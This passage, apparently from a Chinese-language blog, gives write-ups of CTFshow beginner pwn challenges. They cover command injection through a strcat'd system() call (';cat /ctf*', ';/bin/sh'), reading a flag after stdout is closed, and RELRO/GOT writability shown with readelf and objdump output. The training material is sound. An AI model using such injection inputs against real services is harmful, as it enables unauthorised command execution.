。这样，多个命令可以按顺序在一行上执行。</span><br></pre></td></tr></table></figure><p>或者也可以使用 &amp; 将两条命令拼接在一起可以实现并行执行，即这两条命令将同时在后台执行。命令之间使用 &amp; 进行分隔。</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">示例：</span><br><span class="line">command1 &amp; command2 </span><br><span class="line">1command1 和 command2 是两个要执行的命令。通过使用 &amp; 将它们连接起来，它们将同时在后台执行。这种方式下命令的输出可能会相互混合，具体的输出顺序取决于命令的执行速度和系统资源。</span><br></pre></td></tr></table></figure><p>回到题目：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">远程</span><br><span class="line">$ nc IP port</span><br><span class="line">2</span><br><span class="line">;<span class="built_in">cat</span> /ctf*</span><br></pre></td></tr></table></figure><h6 id="分析过程："><a href="#分析过程：" class="headerlink" title="分析过程："></a>分析过程：</h6><p>先checksec</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位保护全开</p><p>IDA查看main函数，找到关键部分：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nEnter the command you want choose:(1.2.3.4 or 5)\n&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        system(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Which directory?(&#x27;/&#x27;,&#x27;./&#x27; or the directiry you want?)&quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xAu</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(dest, buf);</span><br><span class="line">        system(dest);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Execution succeeded!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;$cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        sleep(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;... ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">3u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your flag is ...&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;ctfshow&#123;flag is not here!&#125;&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x14u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wtf?You haven&#x27;t left yet?\nOk~ give you flag:\nflag is loading......&quot;</span>);</span><br><span class="line">        sleep(<span class="number">0x1BF52u</span>);</span><br><span class="line">        system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        sleep(<span class="number">2u</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;su: Authentication failure&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;See you!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;command not found!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这段代码是一个无限循环的菜单程序，根据用户输入的选项执行相应的操作。具体逻辑如下：</p><ol><li><p>显示菜单选项。</p></li><li><p>提示用户输入要选择的命令（1、2、3、4或5）。</p></li><li><p>根据用户的选择执行相应的操作。</p><ul><li><p>如果选择为1，则执行系统命令 “id” 并输出结果。</p></li><li><p>如果选择为2，则要求用户输入目录，并将输入的目录添加到一个字符串中，然后执行该字符串作为系统命令。</p></li><li><p>如果选择为3，则以一定时间间隔逐行输出一段文字，最后执行系统命令 “cat &#x2F;ctfshow_flag” 并输出结果。</p></li><li><p>如果选择为4，则显示 “su: Authentication failure”。</p></li><li><p>如果选择为5，则显示 “See you!”，然后退出程序。</p></li><li><p>如果选择为其他值，则显示 “command not found!”。</p></li></ul></li><li><p>根据执行的结果，将相应的提示信息赋值给变量 v4。</p></li><li><p>根据执行的结果，输出相应的提示信息。</p></li></ol><p>可以看到在选项3最后会执行system(“cat &#x2F;ctfshow_flag”);命令，虽然最终能达到我们想要的效果，但是它sleep了很久很久，本地等的话没什么问题，但是远程环境并没有这么久，因此这条直接pass，其他1&#x2F;4&#x2F;5选项都没有实质性作用，但是2那里会有问题，我们可以进行拼接，限制了10字节</p><p>但是我们完全够用，可以构造出 “;cat &#x2F;ctf*” “;&#x2F;bin&#x2F;sh”等</p><p>直接拿取一个shell或者直接读出flag</p><p>在Linux中，通配符 * 表示匹配任意长度（包括零长度）的任意字符序列。</p><p>所以cat &#x2F;ctf*能够读到flag</p><h2 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h2><p>Hint：仔细看看源码，或许有惊喜</p><p>​    假作真时真亦假，真作假时假亦真</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">远程</span><br><span class="line">$ nc IP port</span><br><span class="line">9</span><br></pre></td></tr></table></figure><h6 id="分析过程：-1"><a href="#分析过程：-1" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec检查保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ checksec pwn</span><br><span class="line">  Arch:       amd64-64-little</span><br><span class="line">  RELRO:      Full RELRO</span><br><span class="line">  Stack:      Canary found</span><br><span class="line">  NX:         NX enabled</span><br><span class="line">  PIE:        PIE enabled</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure><p>64位保护全开</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> main&#123;</span><br><span class="line">    ...</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Which is the real flag?&quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n9);</span><br><span class="line"><span class="keyword">if</span> ( n9 == <span class="number">9</span> )</span><br><span class="line">  fake();</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  real();</span><br><span class="line">system(<span class="string">&quot;cat /ctfshow_flag&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>打印提示消息：”Which is the real flag?”</li><li>使用 scanf 函数接收用户的输入，并将其保存在变量 v4 中。</li><li>如果用户输入的值等于 9，则调用 fake() 函数。</li><li>如果用户输入的值不等于 9，则调用 real() 函数。</li><li>无论用户输入的值是什么，都会执行 system(“cat &#x2F;ctfshow_flag”) 命令，将&#x2F;ctfshow_flag 文件的内容打印出来。</li></ol><p>分别跟进fake()和real():</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">fake</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">real</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo &#x27;flag is here&#x27;&gt;/ctfshow_flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><p>system(“echo ‘flag is here’&gt;&gt;&#x2F;ctfshow_flag”);</p><p>这个命令将字符串 ‘flag is here’ 追加写入 &#x2F;ctfshow_flag 文件中。 &gt;&gt; 符号表示以追加的方式写入文件，如果文件不存在则创建新文件。如果 &#x2F;ctfshow_flag 文件已经存在，那么该命令会在文件的末尾添加 ‘flag is here’ 。</p></li><li><p>system(“echo ‘flag is here’&gt;&#x2F;ctfshow_flag”);</p><p>这个命令将字符串 ‘flag is here’ 覆盖写入 &#x2F;ctfshow_flag 文件中。 &gt; 符号表示以覆盖的方式写入文件，如果文件不存在则创建新文件。如果 &#x2F;ctfshow_flag 文件已经存在，那么该命令会将文件中原有的内容替换为 ‘flag is here’ 。</p></li></ol><p>这两个命令都用于将 ‘flag is here’ 写入 &#x2F;ctfshow_flag 文件中，不同之处在于写入方式的不同。第一个命令使用追加方式，在文件末尾添加内容；第二个命令使用覆盖方式，将文件内容替换为新内容。具体使用哪个命令取决于需求和文件操作的预期结果。也就是所假的其实是我们需要的真的，真的反而是假的</p><p>在远程环境中，我们需要在第一次读到flag，否则后续得到的flag都已经被覆写再追加，真实的flag内容已经没了。</p><h2 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h2><p>Hint：关闭了输出流，一定是最安全的吗？</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : Turn off output, how to get flag?</span><br><span class="line">    * *************************************</span><br><span class="line">give you a shell! now you need to get flag!</span><br><span class="line"><span class="built_in">exec</span> <span class="built_in">cat</span> /ctf* 1&gt;&amp;0</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="分析过程：-2"><a href="#分析过程：-2" class="headerlink" title="分析过程："></a>分析过程：</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>64位保护全开</p><p>IDA查看main函数：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( fork() )</span><br><span class="line">  &#123;</span><br><span class="line">    wait(<span class="number">0</span>);</span><br><span class="line">    sleep(<span class="number">3u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag is not here!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;give you a shell! now you need to get flag!&quot;</span>);</span><br><span class="line">    fclose(_bss_start);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x20u</span>);</span><br><span class="line">    system(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><ol><li>if (fork()) : 这里使用 fork() 函数创建一个子进程。父进程中， fork() 返回子进程的进程ID，所以进入 if 语句块；子进程中， fork() 返回0，所以进入 else 语句块。</li></ol><p>在父进程中： 2.wait(0LL) : 父进程通过 wait() 函数等待子进程的结束，以确保子进程执行完</p><p>毕。</p><ol><li>sleep(3u) : 父进程睡眠3秒钟。</li><li>printf(“flag is not here!”) : 输出提示信息，表明flag不在此处。</li></ol><p>在子进程中： 2.puts(“give you a shell! now you need to get flag!”) : 输出提示信息，</p><p>表示给予用户一个shell，让其获取flag。</p><ol><li>fclose() : 关闭文件输出流。</li><li>read(0, &amp;buf, 0x20uLL) : 从标准输入中读取用户输入的命令，并存储在 buf 中。</li><li>system(&amp;buf) : 执行用户输入的命令。</li></ol><p>我们可以使用了<code>exec 函数来执行 sh 命令</code>，并使用<code>1&gt;&amp;0 来进行输出重定向</code>。这个命令将标准输出重定向到标准输入，实际上就是<code>将命令的输出发送到后续命令的输入</code></p><p>具体来说， <code>1&gt;&amp;0 中的 1 表示标准输出， 0 表示标准输入</code>。通过将标准输出重定向到标准输入，可以实现将命令的输出作为后续命令的输入。这样可以在执行 sh 命令后，进入一个交互式的Shell环境，可以在该环境中执行命令并与用户进行交互。</p><p>也可以直接<code>exec cat /ctf* 1&gt;&amp;0 将 cat /ctf* 命令的输出发送到标准输入</code>，实际上就是<code>将命令的输出再次输出到屏幕上</code>。</p><p>这里限制了20个字节，反弹shell的话理论上也可行，感兴趣的可以自行去尝试。</p><h2 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint:提交ctfshow&#123;【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】&#125;</span><br><span class="line">例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</span><br><span class="line">最终flag为ctfshow&#123;1_1_0x400820_0x8208820&#125;</span><br><span class="line">若某个表不存在，则无需写其对应地址</span><br><span class="line">如不存在.got.plt表，则最终flag值为ctfshow&#123;1_0_0x400820&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x pwn</span><br><span class="line">$ ./pwn 0x600f18</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">RELRO: 52454c52</span><br><span class="line">$ ./pwn 0x600f28</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">RELRO: 52454c52</span><br></pre></td></tr></table></figure><p>程序正常执行，.got表和.got.plt都可写</p><p>故flag:ctfshow{1_1_0x600f18_0x600f28}</p><h6 id="分析过程：-3"><a href="#分析过程：-3" class="headerlink" title="分析过程："></a>分析过程：</h6><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>可以看到仅开启了NX保护，RELRO保护是完全关闭状态</p><p>这里先看一下RELRO保护：</p><p>RELRO（RELocation Read-Only）是一种可选的二进制保护机制，用于增加程序的安全性。它主要通过限制和保护全局偏移表（Global Offset Table，简称 GOT）和过程链接表（Procedure Linkage Table，简称 PLT）的可写性来防止针对这些结构的攻击。RELRO保护有三种状态：</p><ol><li><p>No RELRO：在这种状态下，GOT和PLT都是可写的，意味着攻击者可以修改这些表中的指针，从而进行攻击。这是最弱的保护状态。</p></li><li><p>Partial RELRO：在这种状态下，GOT的开头部分被设置为只读（RO），而剩余部分仍然可写。这样可以防止一些简单的攻击，但仍存在一些漏洞。</p></li><li><p>Full RELRO：在这种状态下，GOT和PLT都被设置为只读（RO）。这样做可以防止对这些结构的修改，提供更强的保护。任何对这些表的修改都会导致程序异常终止。</p></li></ol><p>了解到上述内容后，这个保护的几题都游刃而解了</p><p>IDA查看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.got:0000000000600F18 ; Segment type: Pure data</span><br><span class="line">.got:0000000000600F18 ; Segment permissions: Read/Write</span><br><span class="line">.got:0000000000600F18 _got            segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got:0000000000600F18                 assume cs:_got</span><br><span class="line">.got:0000000000600F18                 ;org 600F18h</span><br><span class="line">.got:0000000000600F18 __libc_start_main_ptr dq offset __libc_start_main</span><br><span class="line">.got:0000000000600F18                                         ; DATA XREF: _start+24↑r</span><br><span class="line">.got:0000000000600F20 __gmon_start___ptr dq offset __gmon_start__</span><br><span class="line">.got:0000000000600F20                                         ; DATA XREF: _init_proc+4↑r</span><br><span class="line">.got:0000000000600F20 _got            ends</span><br><span class="line">.got:0000000000600F20</span><br><span class="line">.got.plt:0000000000600F28 ; ===========================================================================</span><br><span class="line">.got.plt:0000000000600F28</span><br><span class="line">.got.plt:0000000000600F28 ; Segment type: Pure data</span><br><span class="line">.got.plt:0000000000600F28 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:0000000000600F28 _got_plt        segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got.plt:0000000000600F28                 assume cs:_got_plt</span><br><span class="line">.got.plt:0000000000600F28                 ;org 600F28h</span><br><span class="line">.got.plt:0000000000600F28 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span><br><span class="line">.got.plt:0000000000600F30 qword_600F30    dq 0                    ; DATA XREF: sub_400420↑r</span><br><span class="line">.got.plt:0000000000600F38 qword_600F38    dq 0                    ; DATA XREF: sub_400420+6↑r</span><br><span class="line">.got.plt:0000000000600F40 off_600F40      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000600F48 off_600F48      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000600F50 off_600F50      dq offset strtol        ; DATA XREF: _strtol↑r</span><br><span class="line">.got.plt:0000000000600F50 _got_plt        ends</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -R pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600f18 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600f20 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000600f40 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000600f48 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</span><br><span class="line">0000000000600f50 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</span><br></pre></td></tr></table></figure><p>查看一下表项地址</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -S pwn</span><br><span class="line">There are 29 section headers, starting at offset 0x1878:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type             Address           Offset</span><br><span class="line">       Size              EntSize          Flags  Link  Info  Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000400200  00000200</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE             000000000040021c  0000021c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 3] .note.gnu.bu[...] NOTE             000000000040023c  0000023c</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH         0000000000400260  00000260</span><br><span class="line">       000000000000001c  0000000000000000   A       5     0     8</span><br><span class="line">  [ 5] .dynsym           DYNSYM           0000000000400280  00000280</span><br><span class="line">       0000000000000090  0000000000000018   A       6     1     8</span><br><span class="line">  [ 6] .dynstr           STRTAB           0000000000400310  00000310</span><br><span class="line">       000000000000004b  0000000000000000   A       0     0     1</span><br><span class="line">  [ 7] .gnu.version      VERSYM           000000000040035c  0000035c</span><br><span class="line">       000000000000000c  0000000000000002   A       5     0     2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED          0000000000400368  00000368</span><br><span class="line">       0000000000000020  0000000000000000   A       6     1     8</span><br><span class="line">  [ 9] .rela.dyn         RELA             0000000000400388  00000388</span><br><span class="line">       0000000000000030  0000000000000018   A       5     0     8</span><br><span class="line">  [10] .rela.plt         RELA             00000000004003b8  000003b8</span><br><span class="line">       0000000000000048  0000000000000018  AI       5    22     8</span><br><span class="line">  [11] .init             PROGBITS         0000000000400400  00000400</span><br><span class="line">       0000000000000017  0000000000000000  AX       0     0     4</span><br><span class="line">  [12] .plt              PROGBITS         0000000000400420  00000420</span><br><span class="line">       0000000000000040  0000000000000010  AX       0     0     16</span><br><span class="line">  [13] .text             PROGBITS         0000000000400460  00000460</span><br><span class="line">       0000000000000252  0000000000000000  AX       0     0     16</span><br><span class="line">  [14] .fini             PROGBITS         00000000004006b4  000006b4</span><br><span class="line">       0000000000000009  0000000000000000  AX       0     0     4</span><br><span class="line">  [15] .rodata           PROGBITS         00000000004006c0  000006c0</span><br><span class="line">       000000000000053a  0000000000000000   A       0     0     8</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS         0000000000400bfc  00000bfc</span><br><span class="line">       000000000000003c  0000000000000000   A       0     0     4</span><br><span class="line">  [17] .eh_frame         PROGBITS         0000000000400c38  00000c38</span><br><span class="line">       0000000000000100  0000000000000000   A       0     0     8</span><br><span class="line">  [18] .init_array       INIT_ARRAY       0000000000600d38  00000d38</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [19] .fini_array       FINI_ARRAY       0000000000600d40  00000d40</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [20] .dynamic          DYNAMIC          0000000000600d48  00000d48</span><br><span class="line">       00000000000001d0  0000000000000010  WA       6     0     8</span><br><span class="line">  [21] .got              PROGBITS         0000000000600f18  00000f18</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000600f28  00000f28</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .data             PROGBITS         0000000000600f58  00000f58</span><br><span class="line">       0000000000000010  0000000000000000  WA       0     0     8</span><br><span class="line">  [24] .bss              NOBITS           0000000000600f68  00000f68</span><br><span class="line">       0000000000000008  0000000000000000  WA       0     0     1</span><br><span class="line">  [25] .comment          PROGBITS         0000000000000000  00000f68</span><br><span class="line">       0000000000000029  0000000000000001  MS       0     0     1</span><br><span class="line">  [26] .symtab           SYMTAB           0000000000000000  00000f98</span><br><span class="line">       00000000000005e8  0000000000000018          27    43     8</span><br><span class="line">  [27] .strtab           STRTAB           0000000000000000  00001580</span><br><span class="line">       00000000000001f1  0000000000000000           0     0     1</span><br><span class="line">  [28] .shstrtab         STRTAB           0000000000000000  00001771</span><br><span class="line">       0000000000000103  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (<span class="built_in">link</span> order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  D (mbind), l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h2 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h2><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Hint：提交ctfshow&#123;【.got表与.got.plt是否可写(可写为1，不可写为0)】,【.got的地址】,【.got.plt的地址】&#125;</span><br><span class="line">例如 .got可写.got.plt表可写其地址为0x400820 0x8208820</span><br><span class="line">最终flag为ctfshow&#123;1_1_0x400820_0x8208820&#125;</span><br><span class="line">若某个表不存在，则无需写其对应地址</span><br><span class="line">如不存在.got.plt表，则最终flag值为ctfshow&#123;1_0_0x400820&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./pwn 0x600ff0</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">Segmentation fault (core dumped)</span><br><span class="line">$ ./pwn 0x601000</span><br><span class="line">    * *************************************</span><br><span class="line">    * Classify: CTFshow --- PWN --- 入门</span><br><span class="line">    * Type  : Linux_Security_Mechanisms</span><br><span class="line">    * Site  : https://ctf.show/</span><br><span class="line">    * Hint  : What is RELRO protection ?</span><br><span class="line">    * *************************************</span><br><span class="line">RELRO: 52454c52</span><br></pre></td></tr></table></figure><p>在写.got表的时候就会抛出异常，而写.got.plt依旧正常</p><p>故flag:ctfshow{0_1_0x600ff0_0x601000}</p><h6 id="分析过程：-4"><a href="#分析过程：-4" class="headerlink" title="分析过程："></a>分析过程：</h6><p>checksec查看保护</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec pwn</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>可以看到RELRO保护部分开启了</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ objdump -R pwn</span><br><span class="line"></span><br><span class="line">pwn:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line">DYNAMIC RELOCATION RECORDS</span><br><span class="line">OFFSET           TYPE              VALUE</span><br><span class="line">0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5</span><br><span class="line">0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__</span><br><span class="line">0000000000601018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5</span><br><span class="line">0000000000601020 R_X86_64_JUMP_SLOT  <span class="built_in">printf</span>@GLIBC_2.2.5</span><br><span class="line">0000000000601028 R_X86_64_JUMP_SLOT  strtol@GLIBC_2.2.5</span><br></pre></td></tr></table></figure><p>可以看到两种符号的OFFSET不在一页（大小为0x1000字节）上，权限就有可能不同</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -S pwn</span><br><span class="line">There are 29 section headers, starting at offset 0x1950:</span><br><span class="line"></span><br><span class="line">  [21] .got              PROGBITS         0000000000600ff0  00000ff0</span><br><span class="line">       0000000000000010  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .got.plt          PROGBITS         0000000000601000  00001000</span><br><span class="line">       0000000000000030  0000000000000008  WA       0     0     8</span><br></pre></td></tr></table></figure><p>这样看是不是它两还是都可写呢？但是仔细去看程序头就会发现不同：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ readelf -L pwn</span><br><span class="line">Program Headers:</span><br><span class="line">  Type           Offset             VirtAddr           PhysAddr</span><br><span class="line">                 FileSiz            MemSiz              Flags  Align</span><br><span class="line">  PHDR           0x0000000000000040 0x0000000000400040 0x0000000000400040</span><br><span class="line">                 0x00000000000001f8 0x00000000000001f8  R      0x8</span><br><span class="line">  INTERP         0x0000000000000238 0x0000000000400238 0x0000000000400238</span><br><span class="line">                 0x000000000000001c 0x000000000000001c  R      0x1</span><br><span class="line">      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]</span><br><span class="line">  LOAD           0x0000000000000000 0x0000000000400000 0x0000000000400000</span><br><span class="line">                 0x0000000000000d68 0x0000000000000d68  R E    0x200000</span><br><span class="line">  LOAD           0x0000000000000e10 0x0000000000600e10 0x0000000000600e10</span><br><span class="line">                 0x0000000000000230 0x0000000000000238  RW     0x200000</span><br><span class="line">  DYNAMIC        0x0000000000000e20 0x0000000000600e20 0x0000000000600e20</span><br><span class="line">                 0x00000000000001d0 0x00000000000001d0  RW     0x8</span><br><span class="line">  NOTE           0x0000000000000254 0x0000000000400254 0x0000000000400254</span><br><span class="line">                 0x0000000000000044 0x0000000000000044  R      0x4</span><br><span class="line">  GNU_EH_FRAME   0x0000000000000c2c 0x0000000000400c2c 0x0000000000400c2c</span><br><span class="line">                 0x000000000000003c 0x000000000000003c  R      0x4</span><br><span class="line">  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000</span><br><span class="line">                 0x0000000000000000 0x0000000000000000  RW     0x10</span><br><span class="line">  GNU_RELRO      0x0000000000000e10 0x0000000000600e10 0x0000000000600e10</span><br><span class="line">                 0x00000000000001f0 0x00000000000001f0  R      0x1</span><br><span class="line"></span><br><span class="line"> Section to Segment 